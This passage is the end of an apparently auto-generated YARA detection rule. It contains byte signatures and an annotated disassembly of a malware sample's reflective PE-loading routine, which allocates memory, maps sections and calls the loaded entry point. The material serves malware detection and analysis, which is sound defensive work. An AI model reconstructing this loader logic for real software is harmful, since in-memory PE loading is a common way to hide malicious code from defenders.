        $c55 = { 51 8B 44 24 ?? 53 33 C9 55 8B 18 33 ED 66 8B 4B ?? 66 39 6B ?? 8D 44 19 ?? 0F 86 ?? ?? ?? ?? 56 57 8D 78 ?? 8B 07 8B C8 8B D0 C1 E9 1D C1 EA 1E 8B F0 83 E1 01 83 E2 01 C1 EE 1F A9 00 00 00 02 74 ?? 8B 57 ?? 8B 47 ?? 68 00 40 00 00 52 50 FF 15 ?? ?? ?? ?? EB ?? 8D 0C 4A A9 00 00 00 04 8D 14 4E 8B 14 95 ?? ?? ?? ?? 74 ?? 80 CE 02 8B 4F ?? 85 C9 75 ?? A8 40 74 ?? 8B 4B ?? EB ?? A8 80 74 ?? 8B 4B ?? 85 C9 76 ?? 8D 44 24 ?? 50 52 51 8B 4F ?? 51 FF 15 ?? ?? ?? ?? 8B 54 24 ?? 33 C0 45 83 C7 28 8B 1A 66 8B 43 ?? 3B E8 0F 8C ?? ?? ?? ?? 5F 5E 5D 5B 59 C3 }
        /*
function at 0x00403dd0@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - parse PE header
        .text:0x00403dd0  
        .text:0x00403dd0  FUNC: int cdecl sub_00403dd0( int arg0, ) [2 XREFS] 
        .text:0x00403dd0  
        .text:0x00403dd0  Stack Variables: (offset from initial top of stack)
        .text:0x00403dd0             4: int arg0
        .text:0x00403dd0  
        .text:0x00403dd0  53               push ebx
        .text:0x00403dd1  55               push ebp
        .text:0x00403dd2  8b6c240c         mov ebp,dword [esp + 12]
        .text:0x00403dd6  56               push esi
        .text:0x00403dd7  57               push edi
        .text:0x00403dd8  c645004d         mov byte [ebp],77
        .text:0x00403ddc  c645015a         mov byte [ebp + 1],90
        .text:0x00403de0  66817d004d5a     cmp word [ebp],0x00005a4d
        .text:0x00403de6  7407             jz 0x00403def
        .text:0x00403de8  5f               pop edi
        .text:0x00403de9  5e               pop esi
        .text:0x00403dea  5d               pop ebp
        .text:0x00403deb  33c0             xor eax,eax
        .text:0x00403ded  5b               pop ebx
        .text:0x00403dee  c3               ret 
        .text:0x00403def  loc_00403def: [1 XREFS]
        .text:0x00403def  8b5d3c           mov ebx,dword [ebp + 60]
        .text:0x00403df2  03dd             add ebx,ebp
        .text:0x00403df4  813b50450000     cmp dword [ebx],0x00004550
        .text:0x00403dfa  7407             jz 0x00403e03
        .text:0x00403dfc  5f               pop edi
        .text:0x00403dfd  5e               pop esi
        .text:0x00403dfe  5d               pop ebp
        .text:0x00403dff  33c0             xor eax,eax
        .text:0x00403e01  5b               pop ebx
        .text:0x00403e02  c3               ret 
        .text:0x00403e03  loc_00403e03: [1 XREFS]
        .text:0x00403e03  8b4350           mov eax,dword [ebx + 80]
        .text:0x00403e06  8b4b34           mov ecx,dword [ebx + 52]
        .text:0x00403e09  8b3580904000     mov esi,dword [0x00409080]
        .text:0x00403e0f  6a04             push 4
        .text:0x00403e11  6800200000       push 0x00002000
        .text:0x00403e16  50               push eax
        .text:0x00403e17  51               push ecx
        .text:0x00403e18  ffd6             call esi    ;kernel32.VirtualAlloc(0x61616161,0x61616161,0x00002000,4)
        .text:0x00403e1a  8bf8             mov edi,eax
        .text:0x00403e1c  85ff             test edi,edi
        .text:0x00403e1e  7519             jnz 0x00403e39
        .text:0x00403e20  8b5350           mov edx,dword [ebx + 80]
        .text:0x00403e23  6a04             push 4
        .text:0x00403e25  6800200000       push 0x00002000
        .text:0x00403e2a  52               push edx
        .text:0x00403e2b  50               push eax
        .text:0x00403e2c  ffd6             call esi    ;kernel32.VirtualAlloc(<0x00403e18>,0x61616161,0x00002000,4)
        .text:0x00403e2e  8bf8             mov edi,eax
        .text:0x00403e30  85ff             test edi,edi
        .text:0x00403e32  7505             jnz 0x00403e39
        .text:0x00403e34  5f               pop edi
        .text:0x00403e35  5e               pop esi
        .text:0x00403e36  5d               pop ebp
        .text:0x00403e37  5b               pop ebx
        .text:0x00403e38  c3               ret 
        .text:0x00403e39  loc_00403e39: [2 XREFS]
        .text:0x00403e39  6a14             push 20
        .text:0x00403e3b  6a00             push 0
        .text:0x00403e3d  ff15e0904000     call dword [0x004090e0]    ;kernel32.GetProcessHeap()
        .text:0x00403e43  50               push eax
        .text:0x00403e44  ff15dc904000     call dword [0x004090dc]    ;ntdll.RtlAllocateHeap(kernel32.GetProcessHeap(),0,20)
        .text:0x00403e4a  8bf0             mov esi,eax
        .text:0x00403e4c  33c0             xor eax,eax
        .text:0x00403e4e  6a04             push 4
        .text:0x00403e50  6800100000       push 0x00001000
        .text:0x00403e55  897e04           mov dword [esi + 4],edi
        .text:0x00403e58  89460c           mov dword [esi + 12],eax
        .text:0x00403e5b  894608           mov dword [esi + 8],eax
        .text:0x00403e5e  894610           mov dword [esi + 16],eax
        .text:0x00403e61  8b4350           mov eax,dword [ebx + 80]
        .text:0x00403e64  50               push eax
        .text:0x00403e65  57               push edi
        .text:0x00403e66  ff1580904000     call dword [0x00409080]    ;kernel32.VirtualAlloc(kernel32.VirtualAlloc(0x61616161,0x61616161,0x00002000,4),0x61616161,0x00001000,4)
        .text:0x00403e6c  8b4b54           mov ecx,dword [ebx + 84]
        .text:0x00403e6f  6a04             push 4
        .text:0x00403e71  6800100000       push 0x00001000
        .text:0x00403e76  51               push ecx
        .text:0x00403e77  57               push edi
        .text:0x00403e78  ff1580904000     call dword [0x00409080]    ;kernel32.VirtualAlloc(<0x00403e18>,0x61616161,0x00001000,4)
        .text:0x00403e7e  8b553c           mov edx,dword [ebp + 60]
        .text:0x00403e81  8b4b54           mov ecx,dword [ebx + 84]
        .text:0x00403e84  03d1             add edx,ecx
        .text:0x00403e86  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00403e8c  52               push edx
        .text:0x00403e8d  55               push ebp
        .text:0x00403e8e  50               push eax
        .text:0x00403e8f  89442420         mov dword [esp + 32],eax
        .text:0x00403e93  e8c8060000       call 0x00404560    ;sub_00404560(kernel32.VirtualAlloc(<0x00403e18>,0x61616161,0x00001000,4),arg0,0xc2c2c2c2)
        .text:0x00403e98  8b453c           mov eax,dword [ebp + 60]
        .text:0x00403e9b  8b4c2414         mov ecx,dword [esp + 20]
        .text:0x00403e9f  03c1             add eax,ecx
        .text:0x00403ea1  56               push esi
        .text:0x00403ea2  53               push ebx
        .text:0x00403ea3  8906             mov dword [esi],eax
        .text:0x00403ea5  55               push ebp
        .text:0x00403ea6  897834           mov dword [eax + 52],edi
        .text:0x00403ea9  e872000000       call 0x00403f20    ;sub_00403f20(arg0,0xa2b87170,kernel32.HeapAlloc(<0x00403e3d>,0,20))
        .text:0x00403eae  8b4b34           mov ecx,dword [ebx + 52]
        .text:0x00403eb1  8bc7             mov eax,edi
        .text:0x00403eb3  83c40c           add esp,12
        .text:0x00403eb6  2bc1             sub eax,ecx
        .text:0x00403eb8  740a             jz 0x00403ec4
        .text:0x00403eba  50               push eax
        .text:0x00403ebb  56               push esi
        .text:0x00403ebc  e8ef010000       call 0x004040b0    ;sub_004040b0(<0x00403e44>,0xdff82eae)
        .text:0x00403ec1  83c408           add esp,8
        .text:0x00403ec4  loc_00403ec4: [1 XREFS]
        .text:0x00403ec4  56               push esi
        .text:0x00403ec5  e866020000       call 0x00404130    ;sub_00404130(<0x00403e44>)
        .text:0x00403eca  83c404           add esp,4
        .text:0x00403ecd  85c0             test eax,eax
        .text:0x00403ecf  7423             jz 0x00403ef4
        .text:0x00403ed1  56               push esi
        .text:0x00403ed2  e819010000       call 0x00403ff0    ;sub_00403ff0(<0x00403e44>)
        .text:0x00403ed7  8b16             mov edx,dword [esi]
        .text:0x00403ed9  83c404           add esp,4
        .text:0x00403edc  8b4228           mov eax,dword [edx + 40]
        .text:0x00403edf  85c0             test eax,eax
        .text:0x00403ee1  7428             jz 0x00403f0b
        .text:0x00403ee3  03c7             add eax,edi
        .text:0x00403ee5  85c0             test eax,eax
        .text:0x00403ee7  740b             jz 0x00403ef4
        .text:0x00403ee9  6a00             push 0
        .text:0x00403eeb  6a01             push 1
        .text:0x00403eed  57               push edi
        .text:0x00403eee  ffd0             call eax    ;UnknownApi()
        .text:0x00403ef0  85c0             test eax,eax
        .text:0x00403ef2  7510             jnz 0x00403f04
        .text:0x00403ef4  loc_00403ef4: [2 XREFS]
        .text:0x00403ef4  56               push esi
        .text:0x00403ef5  e8e6030000       call 0x004042e0    ;sub_004042e0(<0x00403e44>)
        .text:0x00403efa  83c404           add esp,4
        .text:0x00403efd  33c0             xor eax,eax
        .text:0x00403eff  5f               pop edi
        .text:0x00403f00  5e               pop esi
        .text:0x00403f01  5d               pop ebp
        .text:0x00403f02  5b               pop ebx
        .text:0x00403f03  c3               ret 
        .text:0x00403f04  loc_00403f04: [1 XREFS]
        .text:0x00403f04  c7461001000000   mov dword [esi + 16],1
        .text:0x00403f0b  loc_00403f0b: [1 XREFS]
        .text:0x00403f0b  8bc6             mov eax,esi
        .text:0x00403f0d  5f               pop edi
        .text:0x00403f0e  5e               pop esi
        .text:0x00403f0f  5d               pop ebp
        .text:0x00403f10  5b               pop ebx
        .text:0x00403f11  c3               ret 
        */
        $c56 = { 53 55 8B 6C 24 ?? 56 57 C6 45 ?? 4D C6 45 ?? 5A 66 81 7D ?? 4D 5A 74 ?? 5F 5E 5D 33 C0 5B C3 8B 5D ?? 03 DD 81 3B 50 45 00 00 74 ?? 5F 5E 5D 33 C0 5B C3 8B 43 ?? 8B 4B ?? 8B 35 ?? ?? ?? ?? 6A 04 68 00 20 00 00 50 51 FF D6 8B F8 85 FF 75 ?? 8B 53 ?? 6A 04 68 00 20 00 00 52 50 FF D6 8B F8 85 FF 75 ?? 5F 5E 5D 5B C3 6A 14 6A 00 FF 15 ?? ?? ?? ?? 50 FF 15 ?? ?? ?? ?? 8B F0 33 C0 6A 04 68 00 10 00 00 89 7E ?? 89 46 ?? 89 46 ?? 89 46 ?? 8B 43 ?? 50 57 FF 15 ?? ?? ?? ?? 8B 4B ?? 6A 04 68 00 10 00 00 51 57 FF 15 ?? ?? ?? ?? 8B 55 ?? 8B 4B ?? 03 D1 8B 0D ?? ?? ?? ?? 52 55 50 89 44 24 ?? E8 ?? ?? ?? ?? 8B 45 ?? 8B 4C 24 ?? 03 C1 56 53 89 06 55 89 78 ?? E8 ?? ?? ?? ?? 8B 4B ?? 8B C7 83 C4 0C 2B C1 74 ?? 50 56 E8 ?? ?? ?? ?? 83 C4 08 56 E8 ?? ?? ?? ?? 83 C4 04 85 C0 74 ?? 56 E8 ?? ?? ?? ?? 8B 16 83 C4 04 8B 42 ?? 85 C0 74 ?? 03 C7 85 C0 74 ?? 6A 00 6A 01 57 FF D0 85 C0 75 ?? 56 E8 ?? ?? ?? ?? 83 C4 04 33 C0 5F 5E 5D 5B C3 C7 46 ?? 01 00 00 00 8B C6 5F 5E 5D 5B C3 }
    condition:
        all of them
}

